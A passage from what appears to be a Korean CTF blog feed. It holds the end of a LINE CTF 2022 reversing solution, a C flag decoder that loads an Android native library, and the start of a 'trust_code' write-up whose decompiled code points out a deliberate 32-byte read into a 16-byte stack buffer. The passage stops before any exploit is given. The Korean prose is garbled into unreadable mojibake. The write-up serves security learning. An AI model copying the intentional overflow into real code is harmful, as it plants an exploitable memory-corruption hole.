class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *(*meatbox)(<span class="type">char</span> *);</span><br><span class="line"><span class="type">char</span> *(*soulbox)(<span class="type">char</span> *);</span><br><span class="line"><span class="type">char</span> *(*godbox)(<span class="type">char</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> data[<span class="number">153</span>] = &#123; <span class="number">7</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">2</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *handle;</span><br><span class="line">    <span class="type">char</span> *error;</span><br><span class="line">    <span class="type">char</span> <span class="built_in">map</span>[<span class="number">256</span>][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    handle = dlopen(<span class="string">&quot;./libnative-lib.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span> (!handle) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dlerror();</span><br><span class="line"></span><br><span class="line">    meatbox = (<span class="type">char</span> *(*)(<span class="type">char</span> *)) dlsym(handle, <span class="string">&quot;_Z7meatboxPc&quot;</span>);</span><br><span class="line">    error = dlerror();</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, error);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    soulbox = (<span class="type">char</span> *(*)(<span class="type">char</span> *)) dlsym(handle, <span class="string">&quot;_Z7soulboxPc&quot;</span>);</span><br><span class="line">    error = dlerror();</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, error);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    godbox = (<span class="type">char</span> *(*)(<span class="type">char</span> *)) dlsym(handle, <span class="string">&quot;_Z6godboxPc&quot;</span>);</span><br><span class="line">    error = dlerror();</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, error);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">char</span> <span class="built_in">map</span>[<span class="number">256</span>][<span class="number">3</span>];           <span class="comment">// meatbox, soulbox, godbox</span></span><br><span class="line">    <span class="type">char</span> flag[<span class="number">64</span>] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    setup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x20</span>; i &lt; <span class="number">0x7f</span>; i++) &#123;</span><br><span class="line">        buf[<span class="number">0</span>] = (<span class="type">char</span>) i;</span><br><span class="line">        <span class="built_in">map</span>[i][<span class="number">0</span>] = meatbox(buf)[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">map</span>[i][<span class="number">1</span>] = soulbox(buf)[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">map</span>[i][<span class="number">2</span>] = godbox(buf)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">51</span>; i++) &#123;</span><br><span class="line">        <span class="type">char</span> m = data[i * <span class="number">3</span>];</span><br><span class="line">        <span class="type">char</span> s = data[i * <span class="number">3</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span> g = data[i * <span class="number">3</span> + <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0x20</span>; j &lt; <span class="number">0x7f</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>[j][<span class="number">0</span>] == m</span><br><span class="line">                    &amp;&amp; <span class="built_in">map</span>[j][<span class="number">1</span>] == s</span><br><span class="line">                    &amp;&amp; <span class="built_in">map</span>[j][<span class="number">2</span>] == g</span><br><span class="line">            ) &#123;</span><br><span class="line">                flag[i] = (<span class="type">char</span>) j;</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;fail!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line">beyond1:/ $ cd /data/local/tmp</span><br><span class="line">beyond1:/data/local/tmp $ ./main</span><br><span class="line">LINECTF&#123;watcha_kn0w_ab0ut_r0ll1ng_d0wn_1n_th3_d33p&#125;</span><br></pre></td></tr></table></figure><h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">ì°¸ê³ ìë£Œ</h2><p>[1] <em>JNI Functions</em>, Java Native Interface Specification, 2019. [Online] Available: <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/jniTOC.html">https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/jniTOC.html</a></p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Security/">Security</category>
      
      <category domain="https://juhyun167.github.io/categories/Security/CTF/">CTF</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/08/28/line22-rolling/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[LINE CTF 2022] trust_code</title>
      <link>https://juhyun167.github.io/2022/07/30/line22-trust-code/</link>
      <guid>https://juhyun167.github.io/2022/07/30/line22-trust-code/</guid>
      <pubDate>Sat, 30 Jul 2022 23:07:19 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;/uploads/line22-trust-code/chall.zip&quot;&gt;chall.zip&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%EB%AC%B8%EC%A</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><p><a href="/uploads/line22-trust-code/chall.zip">chall.zip</a></p><h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">ë¬¸ì œ ë¶„ì„</h2><blockquote class="callout-warning">    <p>    <strong>ì£¼ì˜ì‚¬í•­</strong><br>    ì´ ê¸€ì˜ ë‚´ìš©ì„ ì´í•´í•˜ê¸° ìœ„í•´ì„œëŠ” C++ ì˜ˆì™¸ ì²˜ë¦¬ì˜ <a href="/2022/07/17/cpp-exception-handling/">ë‚´ë¶€ êµ¬í˜„</a>ì— ëŒ€í•œ ì§€ì‹ì´ í•„ìš”í•©ë‹ˆë‹¤.    </p></blockquote><p>64ë¹„íŠ¸ x86_64 ë°”ì´ë„ˆë¦¬ <code>trust_code</code> ì™€ <code>Dockerfile</code> ë“±ì´ ì£¼ì–´ì§‘ë‹ˆë‹¤. <code>Dockerfile</code> ì„ ë¹„ë¡¯í•œ ì»¨í…Œì´ë„ˆ ê´€ë ¨ íŒŒì¼ì€ ì›ë³¸ ë¬¸ì œì—ëŠ” ì—†ëŠ” íŒŒì¼ë¡œ, ëŒ€íšŒ í™˜ê²½ì„ êµ¬í˜„í•˜ê¸° ìœ„í•´ ì‘ì„±í•˜ì˜€ìŠµë‹ˆë‹¤. <code>secret_key.txt</code> ëŠ” ì„œë²„ì—ë§Œ ìˆì–´ì•¼ í•˜ëŠ” íŒŒì¼ë¡œ, ëŒ€íšŒ ì°¸ê°€ìì—ê²Œ ë°°í¬ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë°”ì´ë„ˆë¦¬ëŠ” ì‹¬ë³¼ì´ ìˆê³ , Canary, NX, PIE ë³´í˜¸ ê¸°ë²•ì´ ì ìš©ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec trust_code</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/line22/trust_code/trust_code&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ ivì™€ codeë¥¼ ì…ë ¥ë°›ìœ¼ë©°, ì•„ë¬´ ë¬¸ìì—´ì´ë‚˜ ì…ë ¥í–ˆë”ë‹ˆ ì—ëŸ¬ ë©”ì‹œì§€ë¥¼ ì¶œë ¥í•˜ê³  ì¢…ë£Œí•©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./trust_code</span><br><span class="line">iv&gt; aaaa</span><br><span class="line">code&gt; aaaa</span><br><span class="line"></span><br><span class="line">= Executed =</span><br><span class="line"></span><br><span class="line">Sorry for the inconvenience, there was a problem while decrypting code.</span><br></pre></td></tr></table></figure><p><code>main</code> í•¨ìˆ˜ì˜ ë””ì»´íŒŒì¼ ê²°ê³¼ë¥¼ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ ë‹¨ìˆœí•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  launch();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê·¸ëŸ°ë° ë””ìŠ¤ì–´ì…ˆë¸” ê²°ê³¼ë¥¼ ë³´ë©´ <code>__cxa_begin_catch</code> , <code>__cxa_end_catch</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„ì´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì˜ˆì™¸ ì²˜ë¦¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” ëœë”© íŒ¨ë“œ ì¤‘ catch ë¸”ë¡ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ë‚´ë¶€ì—ì„œëŠ” <code>puts</code> í•¨ìˆ˜ë¡œ ì•ì„œ ë³´ì•˜ë˜ ì—ëŸ¬ ë©”ì‹œì§€ë¥¼ ì¶œë ¥í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001860</span> <span class="comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001860</span> <span class="comment">; __unwind &#123; // __gxx_personality_v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001860</span>                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001864</span>                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">fs</span>:<span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000186D</span>                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_8], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001872</span>                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_C], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000187A <span class="comment">;   try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000187A                 <span class="keyword">call</span>    _Z6launchv      <span class="comment">; launch(void)</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000187A <span class="comment">;   &#125; // starts at 187A</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000187F                 <span class="keyword">jmp</span>     $+<span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001884</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001884</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001884</span> loc_1884:                               <span class="comment">; CODE XREF: main+1Fâ†‘j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001884</span>                 <span class="keyword">jmp</span>     loc_18E0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001889</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001889</span> <span class="comment">;   catch(...) // owned by 187A</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001889</span>                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000188C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000188E                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_18], <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001893</span>                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_1C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001897</span>                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_18] <span class="comment">; void *</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000189C                 <span class="keyword">call</span>    ___cxa_begin_catch</span><br><span class="line"><span class="symbol">.text:</span>00000000000018A1                 <span class="keyword">mov</span>     <span class="built_in">cs</span>:loop_cont, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018AB <span class="comment">;   try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018AB                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, s          <span class="comment">; &quot;\nSorry for the inconvenience, there wa&quot;...</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018B2                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span>00000000000018B2 <span class="comment">;   &#125; // starts at 18AB</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018B7                 <span class="keyword">jmp</span>     $+<span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018BC <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018BC</span><br><span class="line"><span class="symbol">.text:</span>00000000000018BC loc_18BC:                               <span class="comment">; CODE XREF: main+57â†‘j</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018BC                 <span class="keyword">xor</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span>        <span class="comment">; status</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018BE                 <span class="keyword">call</span>    _exit</span><br><span class="line"><span class="symbol">.text:</span>00000000000018C3 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018C3 <span class="comment">;   cleanup() // owned by 18AB</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018C3                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018C6                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018C8                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_18], <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018CD                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>+var_1C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018D1 <span class="comment">;   try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000018D1                 <span class="keyword">call</span>    ___cxa_end_catch</span><br><span class="line"><span class="symbol">.text:</span>00000000000018D1 <span class="comment">;   &#125; // starts at 18D1</span></span><br></pre></td></tr></table></figure><p>ë”°ë¼ì„œ <code>main</code> í•¨ìˆ˜ì˜ ì†ŒìŠ¤ ì½”ë“œëŠ” ì‚¬ì‹¤ ë‹¤ìŒê³¼ ê°™ì•„ì•¼ í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        launch();</span><br><span class="line">    &#125; catch (<span class="type">const</span> <span class="built_in">std</span>::exception&amp; e) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Sorry for the inconvenience, there was a problem while decrypting&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>launch</code> í•¨ìˆ˜ëŠ” <code>secret_key.txt</code> íŒŒì¼ì˜ ë‚´ìš©ì„ ì½ì–´ ë°°ì—´ <code>buf</code> ì— ì €ì¥í•©ë‹ˆë‹¤. ì´í›„ <code>buf</code> ì˜ ë‚´ìš©ì„ ì „ì—­ ë°°ì—´ <code>secret_key</code> ì— ëŒ€ì…í•œ í›„ <code>service</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. <code>buf</code> ë°°ì—´ì˜ í¬ê¸°ì—ì„œ <code>secret_key</code> ì˜ ê¸¸ì´ëŠ” 16ë°”ì´íŠ¸ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">launch</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_OWORD *)buf = <span class="number">0LL</span>;</span><br><span class="line">  alarm(<span class="number">30u</span>);</span><br><span class="line">  signal(<span class="number">14</span>, alarm_handler);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;secret_key.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">16uLL</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  *(_OWORD *)secret_key = *(_OWORD *)buf;</span><br><span class="line">  service();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>service</code> í•¨ìˆ˜ëŠ” ë°°ì—´ <code>buf</code> ì— ivë¥¼ ì…ë ¥ë°›ê³ , ë™ì¼í•˜ê²Œ <code>buf</code> ì˜ ë‚´ìš©ì„ ì „ì—­ ë°°ì—´ <code>iv</code> ì— ëŒ€ì…í•œ í›„ <code>loop</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ê·¸ëŸ°ë° ì…ë ¥ë°›ëŠ” ê¸¸ì´ê°€ ë°°ì—´ì˜ í¬ê¸°ë³´ë‹¤ í° 32ë°”ì´íŠ¸ë¡œ ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">service</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+20h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;iv&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">32uLL</span>);                          <span class="comment">// buffer overflow!</span></span><br><span class="line">  *(_OWORD *)iv = *(_OWORD *)buf;</span><br><span class="line">  loop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loop</code> í•¨ìˆ˜ëŠ” <code>loop_cont</code> ê°’ì´ ì°¸ì´ë©´ <code>run</code> í•¨ìˆ˜ë¥¼ ë°˜ë³µí•˜ì—¬ í˜¸ì¶œí•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( loop_cont )</span><br><span class="line">    